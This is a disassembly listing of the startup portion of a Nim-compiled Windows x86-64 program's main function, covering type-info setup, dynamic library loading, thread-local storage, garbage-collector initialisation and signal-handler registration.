  408ebd:	66 c7 05 a2 12 02 00 	movw   $0x301,0x212a2(%rip)        # 42a168 <NTI__VaVACK0bpYmqIQ0mKcHfQQ_+0x8>
  408ec4:	01 03 
  408ec6:	48 c7 05 7f c4 01 00 	movq   $0x0,0x1c47f(%rip)        # 425350 <NTI__kDPg4wXyR8DDyA0MeEjIsw_+0x10>
  408ecd:	00 00 00 00 
  408ed1:	48 c7 05 64 c4 01 00 	movq   $0x2,0x1c464(%rip)        # 425340 <NTI__kDPg4wXyR8DDyA0MeEjIsw_>
  408ed8:	02 00 00 00 
  408edc:	66 c7 05 63 c4 01 00 	movw   $0x321,0x1c463(%rip)        # 425348 <NTI__kDPg4wXyR8DDyA0MeEjIsw_+0x8>
  408ee3:	21 03 
  408ee5:	48 c7 05 20 c4 01 00 	movq   $0x0,0x1c420(%rip)        # 425310 <NTI__k3HXouOuhqAKq0dx450lXQ_+0x10>
  408eec:	00 00 00 00 
  408ef0:	48 c7 05 05 c4 01 00 	movq   $0x1,0x1c405(%rip)        # 425300 <NTI__k3HXouOuhqAKq0dx450lXQ_>
  408ef7:	01 00 00 00 
  408efb:	66 c7 05 04 c4 01 00 	movw   $0x329,0x1c404(%rip)        # 425308 <NTI__k3HXouOuhqAKq0dx450lXQ_+0x8>
  408f02:	29 03 
  408f04:	48 c7 05 b1 c3 01 00 	movq   $0x8,0x1c3b1(%rip)        # 4252c0 <NTI__6H5Oh5UUvVCLiakt9aTwtUQ_>
  408f0b:	08 00 00 00 
  408f0f:	66 c7 05 b0 c3 01 00 	movw   $0x218,0x1c3b0(%rip)        # 4252c8 <NTI__6H5Oh5UUvVCLiakt9aTwtUQ_+0x8>
  408f16:	18 02 
  408f18:	48 c7 05 5d c3 01 00 	movq   $0x30,0x1c35d(%rip)        # 425280 <NTI__KFG1Y2EPzgtJWwuYhMD0Fw_>
  408f1f:	30 00 00 00 
  408f23:	c6 05 5e c3 01 00 11 	movb   $0x11,0x1c35e(%rip)        # 425288 <NTI__KFG1Y2EPzgtJWwuYhMD0Fw_+0x8>
  408f2a:	48 c7 05 7b cc 01 00 	movq   $0x0,0x1cc7b(%rip)        # 425bb0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x410>
  408f31:	00 00 00 00 
  408f35:	c6 05 54 cc 01 00 02 	movb   $0x2,0x1cc54(%rip)        # 425b90 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x3f0>
  408f3c:	48 c7 05 f9 c2 01 00 	movq   $0x8,0x1c2f9(%rip)        # 425240 <NTI__M8bPR1OE5OXPYGyQdVHfTg_>
  408f43:	08 00 00 00 
  408f47:	c6 05 fa c2 01 00 16 	movb   $0x16,0x1c2fa(%rip)        # 425248 <NTI__M8bPR1OE5OXPYGyQdVHfTg_+0x8>
  408f4e:	48 c7 05 a7 c2 01 00 	movq   $0x30,0x1c2a7(%rip)        # 425200 <NTI__yoNlBGx0D2tRizIdhQuENw_>
  408f55:	30 00 00 00 
  408f59:	c6 05 a8 c2 01 00 11 	movb   $0x11,0x1c2a8(%rip)        # 425208 <NTI__yoNlBGx0D2tRizIdhQuENw_+0x8>
  408f60:	48 c7 05 75 cc 01 00 	movq   $0x0,0x1cc75(%rip)        # 425be0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x440>
  408f67:	00 00 00 00 
  408f6b:	c6 05 4e cc 01 00 02 	movb   $0x2,0x1cc4e(%rip)        # 425bc0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x420>
  408f72:	48 c7 05 43 c2 01 00 	movq   $0x30,0x1c243(%rip)        # 4251c0 <NTI__t7nhKLvXTQS9cS8ByJU9bIag_>
  408f79:	30 00 00 00 
  408f7d:	48 89 15 0c 1e 02 00 	mov    %rdx,0x21e0c(%rip)        # 42ad90 <NTI__ICSm8pFV59cLfw6i2pFuM9cg_+0x10>
  408f84:	49 8d 50 60          	lea    0x60(%r8),%rdx
  408f88:	48 89 15 09 1e 02 00 	mov    %rdx,0x21e09(%rip)        # 42ad98 <NTI__ICSm8pFV59cLfw6i2pFuM9cg_+0x18>
  408f8f:	48 8d 15 ea 1d 02 00 	lea    0x21dea(%rip),%rdx        # 42ad80 <NTI__ICSm8pFV59cLfw6i2pFuM9cg_>
  408f96:	48 89 15 33 1e 02 00 	mov    %rdx,0x21e33(%rip)        # 42add0 <NTI__A79aQ4kopJRWUJmF9aQu6afA_+0x10>
  408f9d:	48 8d 15 93 a3 ff ff 	lea    -0x5c6d(%rip),%rdx        # 403337 <Marker_tyRef__A79aQ4kopJRWUJmF9aQu6afA>
  408fa4:	48 89 15 3d 1e 02 00 	mov    %rdx,0x21e3d(%rip)        # 42ade8 <NTI__A79aQ4kopJRWUJmF9aQu6afA_+0x28>
  408fab:	49 8d 90 c0 00 00 00 	lea    0xc0(%r8),%rdx
  408fb2:	48 89 15 a7 c1 01 00 	mov    %rdx,0x1c1a7(%rip)        # 425160 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_45_2.56588>
  408fb9:	48 8d 15 a0 11 02 00 	lea    0x211a0(%rip),%rdx        # 42a160 <NTI__VaVACK0bpYmqIQ0mKcHfQQ_>
  408fc0:	48 89 15 c9 cc 01 00 	mov    %rdx,0x1ccc9(%rip)        # 425c90 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x4f0>
  408fc7:	49 8d 90 f0 00 00 00 	lea    0xf0(%r8),%rdx
  408fce:	48 89 15 93 c1 01 00 	mov    %rdx,0x1c193(%rip)        # 425168 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_45_2.56588+0x8>
  408fd5:	48 8d 15 84 c1 01 00 	lea    0x1c184(%rip),%rdx        # 425160 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_45_2.56588>
  408fdc:	48 89 0d ed c1 01 00 	mov    %rcx,0x1c1ed(%rip)        # 4251d0 <NTI__t7nhKLvXTQS9cS8ByJU9bIag_+0x10>
  408fe3:	4c 89 0d ee c1 01 00 	mov    %r9,0x1c1ee(%rip)        # 4251d8 <NTI__t7nhKLvXTQS9cS8ByJU9bIag_+0x18>
  408fea:	4c 89 15 9f c1 01 00 	mov    %r10,0x1c19f(%rip)        # 425190 <NTI__8SzoIAgLw9ci2v0yafHj9b6Q_+0x10>
  408ff1:	4c 89 1d b0 c1 01 00 	mov    %r11,0x1c1b0(%rip)        # 4251a8 <NTI__8SzoIAgLw9ci2v0yafHj9b6Q_+0x28>
  408ff8:	48 89 15 79 cc 01 00 	mov    %rdx,0x1cc79(%rip)        # 425c78 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x4d8>
  408fff:	48 8d 15 33 a3 ff ff 	lea    -0x5ccd(%rip),%rdx        # 403339 <Marker_tyRef__Ie1m0dv1ZHg72IgPRr1cDw>
  409006:	c6 05 bb c1 01 00 11 	movb   $0x11,0x1c1bb(%rip)        # 4251c8 <NTI__t7nhKLvXTQS9cS8ByJU9bIag_+0x8>
  40900d:	48 c7 05 f8 cb 01 00 	movq   $0x0,0x1cbf8(%rip)        # 425c10 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x470>
  409014:	00 00 00 00 
  409018:	c6 05 d1 cb 01 00 02 	movb   $0x2,0x1cbd1(%rip)        # 425bf0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x450>
  40901f:	48 c7 05 56 c1 01 00 	movq   $0x8,0x1c156(%rip)        # 425180 <NTI__8SzoIAgLw9ci2v0yafHj9b6Q_>
  409026:	08 00 00 00 
  40902a:	c6 05 57 c1 01 00 16 	movb   $0x16,0x1c157(%rip)        # 425188 <NTI__8SzoIAgLw9ci2v0yafHj9b6Q_+0x8>
  409031:	48 c7 05 44 1d 02 00 	movq   $0x30,0x21d44(%rip)        # 42ad80 <NTI__ICSm8pFV59cLfw6i2pFuM9cg_>
  409038:	30 00 00 00 
  40903c:	c6 05 45 1d 02 00 11 	movb   $0x11,0x21d45(%rip)        # 42ad88 <NTI__ICSm8pFV59cLfw6i2pFuM9cg_+0x8>
  409043:	48 c7 05 f2 cb 01 00 	movq   $0x0,0x1cbf2(%rip)        # 425c40 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x4a0>
  40904a:	00 00 00 00 
  40904e:	c6 05 cb cb 01 00 02 	movb   $0x2,0x1cbcb(%rip)        # 425c20 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x480>
  409055:	48 c7 05 60 1d 02 00 	movq   $0x8,0x21d60(%rip)        # 42adc0 <NTI__A79aQ4kopJRWUJmF9aQu6afA_>
  40905c:	08 00 00 00 
  409060:	c6 05 61 1d 02 00 16 	movb   $0x16,0x21d61(%rip)        # 42adc8 <NTI__A79aQ4kopJRWUJmF9aQu6afA_+0x8>
  409067:	c6 05 12 cc 01 00 01 	movb   $0x1,0x1cc12(%rip)        # 425c80 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x4e0>
  40906e:	48 c7 05 0f cc 01 00 	movq   $0x0,0x1cc0f(%rip)        # 425c88 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x4e8>
  409075:	00 00 00 00 
  409079:	48 89 35 18 cc 01 00 	mov    %rsi,0x1cc18(%rip)        # 425c98 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x4f8>
  409080:	c6 05 29 cc 01 00 01 	movb   $0x1,0x1cc29(%rip)        # 425cb0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x510>
  409087:	48 c7 05 26 cc 01 00 	movq   $0x8,0x1cc26(%rip)        # 425cb8 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x518>
  40908e:	08 00 00 00 
  409092:	48 89 3d 27 cc 01 00 	mov    %rdi,0x1cc27(%rip)        # 425cc0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x520>
  409099:	48 89 1d 28 cc 01 00 	mov    %rbx,0x1cc28(%rip)        # 425cc8 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x528>
  4090a0:	48 c7 05 c5 cb 01 00 	movq   $0x2,0x1cbc5(%rip)        # 425c70 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x4d0>
  4090a7:	02 00 00 00 
  4090ab:	c6 05 9e cb 01 00 02 	movb   $0x2,0x1cb9e(%rip)        # 425c50 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x4b0>
  4090b2:	48 c7 05 63 c0 01 00 	movq   $0x8,0x1c063(%rip)        # 425120 <NTI__Ie1m0dv1ZHg72IgPRr1cDw_>
  4090b9:	08 00 00 00 
  4090bd:	48 89 05 0c 51 02 00 	mov    %rax,0x2510c(%rip)        # 42e1d0 <NTI__iLZrPn9anoh9ad1MmO0RczFw_+0x10>
  4090c4:	49 8d 80 20 01 00 00 	lea    0x120(%r8),%rax
  4090cb:	48 89 05 06 51 02 00 	mov    %rax,0x25106(%rip)        # 42e1d8 <NTI__iLZrPn9anoh9ad1MmO0RczFw_+0x18>
  4090d2:	48 8d 05 e7 50 02 00 	lea    0x250e7(%rip),%rax        # 42e1c0 <NTI__iLZrPn9anoh9ad1MmO0RczFw_>
  4090d9:	48 89 0d 50 c0 01 00 	mov    %rcx,0x1c050(%rip)        # 425130 <NTI__Ie1m0dv1ZHg72IgPRr1cDw_+0x10>
  4090e0:	48 8d 0d 39 86 00 00 	lea    0x8639(%rip),%rcx        # 411720 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_31>
  4090e7:	48 89 05 22 51 02 00 	mov    %rax,0x25122(%rip)        # 42e210 <NTI__HMIVdYjdZYWskTmTQVo5BQ_+0x10>
  4090ee:	48 8d 05 00 a2 ff ff 	lea    -0x5e00(%rip),%rax        # 4032f5 <Marker_tyRef__HMIVdYjdZYWskTmTQVo5BQ>
  4090f5:	c6 05 2c c0 01 00 16 	movb   $0x16,0x1c02c(%rip)        # 425128 <NTI__Ie1m0dv1ZHg72IgPRr1cDw_+0x8>
  4090fc:	48 89 15 45 c0 01 00 	mov    %rdx,0x1c045(%rip)        # 425148 <NTI__Ie1m0dv1ZHg72IgPRr1cDw_+0x28>
  409103:	48 c7 05 b2 50 02 00 	movq   $0x30,0x250b2(%rip)        # 42e1c0 <NTI__iLZrPn9anoh9ad1MmO0RczFw_>
  40910a:	30 00 00 00 
  40910e:	c6 05 b3 50 02 00 11 	movb   $0x11,0x250b3(%rip)        # 42e1c8 <NTI__iLZrPn9anoh9ad1MmO0RczFw_+0x8>
  409115:	48 c7 05 e0 cb 01 00 	movq   $0x0,0x1cbe0(%rip)        # 425d00 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x560>
  40911c:	00 00 00 00 
  409120:	c6 05 b9 cb 01 00 02 	movb   $0x2,0x1cbb9(%rip)        # 425ce0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_0.56589+0x540>
  409127:	48 c7 05 ce 50 02 00 	movq   $0x8,0x250ce(%rip)        # 42e200 <NTI__HMIVdYjdZYWskTmTQVo5BQ_>
  40912e:	08 00 00 00 
  409132:	c6 05 cf 50 02 00 16 	movb   $0x16,0x250cf(%rip)        # 42e208 <NTI__HMIVdYjdZYWskTmTQVo5BQ_+0x8>
  409139:	48 89 05 e8 50 02 00 	mov    %rax,0x250e8(%rip)        # 42e228 <NTI__HMIVdYjdZYWskTmTQVo5BQ_+0x28>
  409140:	e8 66 88 ff ff       	call   4019ab <nimLoadLibrary>
  409145:	48 85 c0             	test   %rax,%rax
  409148:	48 89 05 b1 bf 01 00 	mov    %rax,0x1bfb1(%rip)        # 425100 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_29>
  40914f:	75 0c                	jne    40915d <main+0xb0d>
  409151:	48 8d 0d a8 85 00 00 	lea    0x85a8(%rip),%rcx        # 411700 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_32>
  409158:	e8 47 8e ff ff       	call   401fa4 <nimLoadLibraryError>
  40915d:	48 8d 15 94 31 00 00 	lea    0x3194(%rip),%rdx        # 40c2f8 <.rdata+0x2f8>
  409164:	48 89 c1             	mov    %rax,%rcx
  409167:	e8 03 8d ff ff       	call   401e6f <nimGetProcAddr>
  40916c:	48 8b 0d 8d bf 01 00 	mov    0x1bf8d(%rip),%rcx        # 425100 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_29>
  409173:	48 8d 15 8b 31 00 00 	lea    0x318b(%rip),%rdx        # 40c305 <.rdata+0x305>
  40917a:	48 89 05 77 bf 01 00 	mov    %rax,0x1bf77(%rip)        # 4250f8 <Dl_1285026_>
  409181:	e8 e9 8c ff ff       	call   401e6f <nimGetProcAddr>
  409186:	48 8b 0d 73 bf 01 00 	mov    0x1bf73(%rip),%rcx        # 425100 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_29>
  40918d:	48 8d 15 7e 31 00 00 	lea    0x317e(%rip),%rdx        # 40c312 <.rdata+0x312>
  409194:	48 89 05 55 bf 01 00 	mov    %rax,0x1bf55(%rip)        # 4250f0 <Dl_1285210_>
  40919b:	e8 cf 8c ff ff       	call   401e6f <nimGetProcAddr>
  4091a0:	48 8b 0d 59 bf 01 00 	mov    0x1bf59(%rip),%rcx        # 425100 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_29>
  4091a7:	48 8d 15 78 31 00 00 	lea    0x3178(%rip),%rdx        # 40c326 <.rdata+0x326>
  4091ae:	48 89 05 eb 4f 02 00 	mov    %rax,0x24feb(%rip)        # 42e1a0 <Dl_1285035_>
  4091b5:	e8 b5 8c ff ff       	call   401e6f <nimGetProcAddr>
  4091ba:	48 89 05 77 1c 02 00 	mov    %rax,0x21c77(%rip)        # 42ae38 <Dl_1285039_>
  4091c1:	ff 15 4d f1 03 00    	call   *0x3f14d(%rip)        # 448314 <__imp_TlsAlloc>
  4091c7:	48 8d 15 52 cb 01 00 	lea    0x1cb52(%rip),%rdx        # 425d20 <mainThread__6r3APOnKvB9aL9atazGvT52A>
  4091ce:	89 c1                	mov    %eax,%ecx
  4091d0:	89 05 d2 09 02 00    	mov    %eax,0x209d2(%rip)        # 429ba8 <globalsSlot__ciXDZu9c27pHpCRMoz4RIgw>
  4091d6:	ff 15 48 f1 03 00    	call   *0x3f148(%rip)        # 448324 <__imp_TlsSetValue>
  4091dc:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
  4091e1:	e8 ef 8a ff ff       	call   401cd5 <nimGC_setStackBottom>
  4091e6:	e8 b5 8a ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.73>
  4091eb:	48 8d 0d e1 9f ff ff 	lea    -0x601f(%rip),%rcx        # 4031d3 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_3>
  4091f2:	e8 11 8e ff ff       	call   402008 <nimRegisterThreadLocalMarker>
  4091f7:	48 8d 0d ea 9f ff ff 	lea    -0x6016(%rip),%rcx        # 4031e8 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_6>
  4091fe:	e8 05 8e ff ff       	call   402008 <nimRegisterThreadLocalMarker>
  409203:	e8 b3 da ff ff       	call   406cbb <initGC__amVlU9ajqZ06ujoesRBHcDg>
  409208:	48 8d 15 f5 c3 ff ff 	lea    -0x3c0b(%rip),%rdx        # 405604 <signalHandler>
  40920f:	b9 02 00 00 00       	mov    $0x2,%ecx
  409214:	e8 e7 f1 ff ff       	call   408400 <signal>
  409219:	48 8d 15 e4 c3 ff ff 	lea    -0x3c1c(%rip),%rdx        # 405604 <signalHandler>
  409220:	b9 0b 00 00 00       	mov    $0xb,%ecx
  409225:	e8 d6 f1 ff ff       	call   408400 <signal>
  40922a:	48 8d 15 d3 c3 ff ff 	lea    -0x3c2d(%rip),%rdx        # 405604 <signalHandler>
  409231:	b9 16 00 00 00       	mov    $0x16,%ecx
  409236:	e8 c5 f1 ff ff       	call   408400 <signal>
  40923b:	48 8d 15 c2 c3 ff ff 	lea    -0x3c3e(%rip),%rdx        # 405604 <signalHandler>
  409242:	b9 08 00 00 00       	mov    $0x8,%ecx
  409247:	e8 b4 f1 ff ff       	call   408400 <signal>
  40924c:	48 8d 15 b1 c3 ff ff 	lea    -0x3c4f(%rip),%rdx        # 405604 <signalHandler>
  409253:	b9 04 00 00 00       	mov    $0x4,%ecx
  409258:	e8 a3 f1 ff ff       	call   408400 <signal>
  40925d:	48 8d 0d 5c 09 02 00 	lea    0x2095c(%rip),%rcx        # 429bc0 <heapLock__Cm9aJxbMhUuv7Cj8trffHQw>
  409264:	ff 15 4a f0 03 00    	call   *0x3f04a(%rip)        # 4482b4 <__imp_InitializeCriticalSection>
  40926a:	48 8d 0d 2f 85 00 00 	lea    0x852f(%rip),%rcx        # 4117a0 <TM__k6kyf4Co79a84IkK9blFuQVA_5>
  409271:	e8 35 87 ff ff       	call   4019ab <nimLoadLibrary>
  409276:	48 8d 0d 03 85 00 00 	lea    0x8503(%rip),%rcx        # 411780 <TM__k6kyf4Co79a84IkK9blFuQVA_2>
  40927d:	48 85 c0             	test   %rax,%rax
  409280:	48 89 05 c9 09 02 00 	mov    %rax,0x209c9(%rip)        # 429c50 <TM__k6kyf4Co79a84IkK9blFuQVA_3>
  409287:	0f 84 cb fe ff ff    	je     409158 <main+0xb08>
  40928d:	48 8d 15 9b 30 00 00 	lea    0x309b(%rip),%rdx        # 40c32f <.rdata+0x32f>
  409294:	48 89 c1             	mov    %rax,%rcx
  409297:	e8 d3 8b ff ff       	call   401e6f <nimGetProcAddr>
  40929c:	48 8d 0d bd 84 00 00 	lea    0x84bd(%rip),%rcx        # 411760 <TM__k6kyf4Co79a84IkK9blFuQVA_10>
  4092a3:	48 89 05 9e 09 02 00 	mov    %rax,0x2099e(%rip)        # 429c48 <Dl_14038442_>
  4092aa:	e8 fc 86 ff ff       	call   4019ab <nimLoadLibrary>
  4092af:	48 8d 0d 8a 84 00 00 	lea    0x848a(%rip),%rcx        # 411740 <TM__k6kyf4Co79a84IkK9blFuQVA_11>
  4092b6:	48 85 c0             	test   %rax,%rax
  4092b9:	48 89 05 80 09 02 00 	mov    %rax,0x20980(%rip)        # 429c40 <TM__k6kyf4Co79a84IkK9blFuQVA_8>
  4092c0:	0f 84 92 fe ff ff    	je     409158 <main+0xb08>
  4092c6:	48 8d 15 6d 30 00 00 	lea    0x306d(%rip),%rdx        # 40c33a <.rdata+0x33a>
  4092cd:	48 89 c1             	mov    %rax,%rcx
  4092d0:	e8 9a 8b ff ff       	call   401e6f <nimGetProcAddr>
  4092d5:	48 8b 0d 64 09 02 00 	mov    0x20964(%rip),%rcx        # 429c40 <TM__k6kyf4Co79a84IkK9blFuQVA_8>
  4092dc:	48 8d 15 66 30 00 00 	lea    0x3066(%rip),%rdx        # 40c349 <.rdata+0x349>
  4092e3:	48 89 05 4e 09 02 00 	mov    %rax,0x2094e(%rip)        # 429c38 <Dl_14036835_>
  4092ea:	e8 80 8b ff ff       	call   401e6f <nimGetProcAddr>
  4092ef:	48 8b 0d 4a 09 02 00 	mov    0x2094a(%rip),%rcx        # 429c40 <TM__k6kyf4Co79a84IkK9blFuQVA_8>
  4092f6:	48 8d 15 56 30 00 00 	lea    0x3056(%rip),%rdx        # 40c353 <.rdata+0x353>
  4092fd:	48 89 05 2c 09 02 00 	mov    %rax,0x2092c(%rip)        # 429c30 <Dl_14037001_>
  409304:	e8 66 8b ff ff       	call   401e6f <nimGetProcAddr>
  409309:	48 8b 0d 40 09 02 00 	mov    0x20940(%rip),%rcx        # 429c50 <TM__k6kyf4Co79a84IkK9blFuQVA_3>
  409310:	48 8d 15 49 30 00 00 	lea    0x3049(%rip),%rdx        # 40c360 <.rdata+0x360>
  409317:	48 89 05 0a 09 02 00 	mov    %rax,0x2090a(%rip)        # 429c28 <Dl_14036830_>
  40931e:	e8 4c 8b ff ff       	call   401e6f <nimGetProcAddr>
  409323:	48 8b 0d 26 09 02 00 	mov    0x20926(%rip),%rcx        # 429c50 <TM__k6kyf4Co79a84IkK9blFuQVA_3>
  40932a:	48 8d 15 36 30 00 00 	lea    0x3036(%rip),%rdx        # 40c367 <.rdata+0x367>
  409331:	48 89 05 e8 08 02 00 	mov    %rax,0x208e8(%rip)        # 429c20 <Dl_14038260_>
  409338:	e8 32 8b ff ff       	call   401e6f <nimGetProcAddr>
  40933d:	48 8b 0d 0c 09 02 00 	mov    0x2090c(%rip),%rcx        # 429c50 <TM__k6kyf4Co79a84IkK9blFuQVA_3>
  409344:	48 8d 15 25 30 00 00 	lea    0x3025(%rip),%rdx        # 40c370 <.rdata+0x370>
  40934b:	48 89 05 c6 08 02 00 	mov    %rax,0x208c6(%rip)        # 429c18 <Dl_14040067_>
  409352:	e8 18 8b ff ff       	call   401e6f <nimGetProcAddr>
  409357:	48 8b 0d e2 08 02 00 	mov    0x208e2(%rip),%rcx        # 429c40 <TM__k6kyf4Co79a84IkK9blFuQVA_8>
  40935e:	48 8d 15 17 30 00 00 	lea    0x3017(%rip),%rdx        # 40c37c <.rdata+0x37c>
  409365:	48 89 05 a4 08 02 00 	mov    %rax,0x208a4(%rip)        # 429c10 <Dl_14038265_>
  40936c:	e8 fe 8a ff ff       	call   401e6f <nimGetProcAddr>
  409371:	48 8b 0d c8 08 02 00 	mov    0x208c8(%rip),%rcx        # 429c40 <TM__k6kyf4Co79a84IkK9blFuQVA_8>
  409378:	48 8d 15 10 30 00 00 	lea    0x3010(%rip),%rdx        # 40c38f <.rdata+0x38f>
  40937f:	48 89 05 82 08 02 00 	mov    %rax,0x20882(%rip)        # 429c08 <Dl_14037022_>
  409386:	e8 e4 8a ff ff       	call   401e6f <nimGetProcAddr>
  40938b:	48 8b 0d ae 08 02 00 	mov    0x208ae(%rip),%rcx        # 429c40 <TM__k6kyf4Co79a84IkK9blFuQVA_8>
  409392:	48 8d 15 0d 30 00 00 	lea    0x300d(%rip),%rdx        # 40c3a6 <.rdata+0x3a6>
  409399:	48 89 05 60 08 02 00 	mov    %rax,0x20860(%rip)        # 429c00 <Dl_14037645_>
  4093a0:	e8 ca 8a ff ff       	call   401e6f <nimGetProcAddr>
  4093a5:	48 8b 0d 94 08 02 00 	mov    0x20894(%rip),%rcx        # 429c40 <TM__k6kyf4Co79a84IkK9blFuQVA_8>
  4093ac:	48 8d 15 0b 30 00 00 	lea    0x300b(%rip),%rdx        # 40c3be <.rdata+0x3be>
  4093b3:	48 89 05 3e 08 02 00 	mov    %rax,0x2083e(%rip)        # 429bf8 <Dl_14037647_>
  4093ba:	e8 b0 8a ff ff       	call   401e6f <nimGetProcAddr>
  4093bf:	48 8b 0d 7a 08 02 00 	mov    0x2087a(%rip),%rcx        # 429c40 <TM__k6kyf4Co79a84IkK9blFuQVA_8>
  4093c6:	48 8d 15 fb 2f 00 00 	lea    0x2ffb(%rip),%rdx        # 40c3c8 <.rdata+0x3c8>
  4093cd:	48 89 05 1c 08 02 00 	mov    %rax,0x2081c(%rip)        # 429bf0 <Dl_14037631_>
  4093d4:	e8 96 8a ff ff       	call   401e6f <nimGetProcAddr>
  4093d9:	48 8d 15 70 09 02 00 	lea    0x20970(%rip),%rdx        # 429d50 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0x90>
  4093e0:	48 c7 05 55 0a 02 00 	movq   $0x28,0x20a55(%rip)        # 429e40 <NTI__F8OvqlxXyGXRSiK9c1fCDVw_>
  4093e7:	28 00 00 00 
  4093eb:	48 89 15 6e 08 02 00 	mov    %rdx,0x2086e(%rip)        # 429c60 <TM__6NbDwwj5FY059b1gz2AsAZQ_3_2.52481>
  4093f2:	48 83 c2 30          	add    $0x30,%rdx
  4093f6:	48 89 15 6b 08 02 00 	mov    %rdx,0x2086b(%rip)        # 429c68 <TM__6NbDwwj5FY059b1gz2AsAZQ_3_2.52481+0x8>
  4093fd:	48 8d 15 5c 08 02 00 	lea    0x2085c(%rip),%rdx        # 429c60 <TM__6NbDwwj5FY059b1gz2AsAZQ_3_2.52481>
  409404:	48 89 05 dd 07 02 00 	mov    %rax,0x207dd(%rip)        # 429be8 <Dl_14037864_>
  40940b:	48 8d 05 de 08 02 00 	lea    0x208de(%rip),%rax        # 429cf0 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0x30>
  409412:	48 89 15 2f 09 02 00 	mov    %rdx,0x2092f(%rip)        # 429d48 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0x88>
  409419:	48 8d 15 00 09 02 00 	lea    0x20900(%rip),%rdx        # 429d20 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0x60>
  409420:	48 89 05 e9 09 02 00 	mov    %rax,0x209e9(%rip)        # 429e10 <TM__6NbDwwj5FY059b1gz2AsAZQ_2_3.52480>
  409427:	48 8d 05 52 08 02 00 	lea    0x20852(%rip),%rax        # 429c80 <NTI__bs1dgeTxHIjPGTR9axkkHbg_>
  40942e:	48 89 15 63 08 02 00 	mov    %rdx,0x20863(%rip)        # 429c98 <NTI__bs1dgeTxHIjPGTR9axkkHbg_+0x18>
  409435:	48 8d 15 92 2f 00 00 	lea    0x2f92(%rip),%rdx        # 40c3ce <.rdata+0x3ce>
  40943c:	48 89 05 bd 08 02 00 	mov    %rax,0x208bd(%rip)        # 429d00 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0x40>
  409443:	48 8d 0d b8 2f 00 00 	lea    0x2fb8(%rip),%rcx        # 40c402 <.rdata+0x402>
  40944a:	48 89 15 b7 08 02 00 	mov    %rdx,0x208b7(%rip)        # 429d08 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0x48>
  409451:	48 8d 15 58 09 02 00 	lea    0x20958(%rip),%rdx        # 429db0 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0xf0>
  409458:	48 89 05 61 09 02 00 	mov    %rax,0x20961(%rip)        # 429dc0 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0x100>
  40945f:	48 8d 05 7e 2f 00 00 	lea    0x2f7e(%rip),%rax        # 40c3e4 <.rdata+0x3e4>
  409466:	48 89 05 5b 09 02 00 	mov    %rax,0x2095b(%rip)        # 429dc8 <TM__6NbDwwj5FY059b1gz2AsAZQ_0.52482+0x108>
  40946d:	48 8d 42 30          	lea    0x30(%rdx),%rax
  409471:	48 89 05 a8 09 02 00 	mov    %rax,0x209a8(%rip)        # 429e20 <TM__6NbDwwj5FY059b1gz2AsAZQ_2_3.52480+0x10>
  409478:	48 8d 05 46 2e 00 00 	lea    0x2e46(%rip),%rax        # 40c2c5 <.rdata+0x2c5>
  40947f:	48 89 15 92 09 02 00 	mov    %rdx,0x20992(%rip)        # 429e18 <TM__6NbDwwj5FY059b1gz2AsAZQ_2_3.52480+0x8>
  409486:	c6 05 bb 09 02 00 12 	movb   $0x12,0x209bb(%rip)        # 429e48 <NTI__F8OvqlxXyGXRSiK9c1fCDVw_+0x8>
  40948d:	48 c7 05 b8 09 02 00 	movq   $0x0,0x209b8(%rip)        # 429e50 <NTI__F8OvqlxXyGXRSiK9c1fCDVw_+0x10>
  409494:	00 00 00 00 
  409498:	48 c7 05 dd 07 02 00 	movq   $0x10,0x207dd(%rip)        # 429c80 <NTI__bs1dgeTxHIjPGTR9axkkHbg_>
  40949f:	10 00 00 00 
  4094a3:	c6 05 de 07 02 00 12 	movb   $0x12,0x207de(%rip)        # 429c88 <NTI__bs1dgeTxHIjPGTR9axkkHbg_+0x8>
  4094aa:	48 c7 05 db 07 02 00 	movq   $0x0,0x207db(%rip)        # 429c90 <NTI__bs1dgeTxHIjPGTR9axkkHbg_+0x10>
  4094b1:	00 00 00 00 
